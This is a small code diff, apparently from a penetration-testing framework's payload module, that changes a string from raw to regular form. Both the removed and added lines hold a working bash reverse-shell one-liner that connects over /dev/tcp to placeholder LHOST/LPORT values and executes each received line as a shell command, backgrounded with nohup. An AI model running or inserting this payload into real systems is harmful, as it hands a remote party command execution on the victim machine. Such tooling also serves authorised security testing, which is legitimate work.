@@ -23,4 +23,4 @@ class Payload:
 
     attrs = {}
 
-    data = r"nohup `exec 5<>/dev/tcp/*LHOST*/*LPORT*;cat <&5 | while read line; do $line 2>&5 >&5; done` &"
+    data = "nohup `exec 5<>/dev/tcp/*LHOST*/*LPORT*;cat <&5 | while read line; do $line 2>&5 >&5; done` &"
